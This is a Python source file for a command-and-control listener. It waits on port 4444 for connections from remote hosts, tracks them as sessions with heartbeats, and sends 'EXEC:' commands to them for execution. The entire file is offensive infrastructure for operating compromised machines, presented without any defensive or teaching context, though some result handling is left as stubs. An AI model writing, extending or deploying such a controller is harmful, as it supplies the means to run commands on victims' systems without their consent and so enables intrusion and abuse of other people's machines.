import socket
import threading
import json
import base64
import time
from datetime import datetime

class C2Listener:
    """Multi-protocol C2 listener"""
    
    def __init__(self):
        self.sessions = {}
        self.running = False
        self.threads = []
    
    def start_tcp(self, host='0.0.0.0', port=4444):
        """Start TCP listener"""
        def _listen():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((host, port))
            sock.listen(5)
            self.running = True
            
            while self.running:
                try:
                    client, addr = sock.accept()
                    session_id = f"{addr[0]}:{addr[1]}_{int(time.time())}"
                    self.sessions[session_id] = {
                        'socket': client,
                        'addr': addr,
                        'connected_at': datetime.now().isoformat(),
                        'last_heartbeat': time.time()
                    }
                    # Spawn handler
                    t = threading.Thread(target=self._handle_session, args=(session_id, client))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                except:
                    break
            sock.close()
        
        t = threading.Thread(target=_listen)
        t.daemon = True
        t.start()
        return {'status': 'listening', 'host': host, 'port': port}
    
    def _handle_session(self, session_id, sock):
        """Handle a single session"""
        while self.running:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                # Process command
                self._process_data(session_id, data)
            except:
                break
        
        sock.close()
        if session_id in self.sessions:
            del self.sessions[session_id]
    
    def _process_data(self, session_id, data):
        """Process incoming data"""
        try:
            decoded = data.decode().strip()
            if decoded == 'HEARTBEAT':
                self.sessions[session_id]['last_heartbeat'] = time.time()
                self.sessions[session_id]['socket'].send(b'ACK\n')
            elif decoded.startswith('CMD:'):
                # Command response
                cmd_result = decoded[4:]
                # Store in database
                pass
            else:
                # Raw data
                pass
        except:
            pass
    
    def send_command(self, session_id, command):
        """Send command to session"""
        if session_id not in self.sessions:
            return {'status': 'error', 'message': 'Session not found'}
        
        sock = self.sessions[session_id]['socket']
        try:
            sock.send(f"EXEC:{command}\n".encode())
            return {'status': 'sent', 'session': session_id}
        except:
            return {'status': 'error', 'message': 'Send failed'}
    
    def stop(self):
        self.running = False
        for session in self.sessions.values():
            try:
                session['socket'].close()
            except:
                pass
        return {'status': 'stopped'}
